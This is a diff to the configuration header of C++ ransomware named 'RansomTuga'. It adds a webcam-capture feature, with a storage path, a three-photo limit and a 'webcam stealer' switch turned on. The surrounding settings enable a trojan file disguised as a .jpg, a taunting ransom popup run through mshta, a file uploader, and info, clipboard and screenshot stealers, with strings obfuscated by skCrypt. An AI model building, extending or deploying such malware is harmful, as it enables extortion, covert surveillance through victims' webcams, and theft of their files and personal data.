@@ -34,10 +34,12 @@
 #define FILESICON		(string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// filepath of the default icon of encrypted files
 #define CUSTOMFILE_LOC	(string)skCrypt("C:\\customfile.extension")					// filepath of the custom file dropped
 #define TROJANFILE		(string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// filepath of the real program
+#define WEBCAM_PATH		(string)skCrypt("C:\\Windows\\System32\\webcams\\")			// filepath of the webcams' images
 
 /* misc settings */
 #define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
 #define NUMBER_RETRIES		3		// maximum retries for decryptor
+#define MAX_PHOTOS			3		// maximum webcam captured
 
 /* enabling features */
 #define DEBUG				true	// enable or disable debug mode (print in console)
@@ -47,6 +49,7 @@
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
 #define FILE_UPLOADER		true	// enable or disable file uploader
+#define TAKE_WEBCAMS		true	// enable or disable webcam stealer
 #define STEAL_INFO			true	// enable or disable info stealer
 #define GET_CLIPBOARD		true	// enable or disable clipboard grabber
 #define GET_SCREENSHOT		true	// enable or disable screenshot grabber
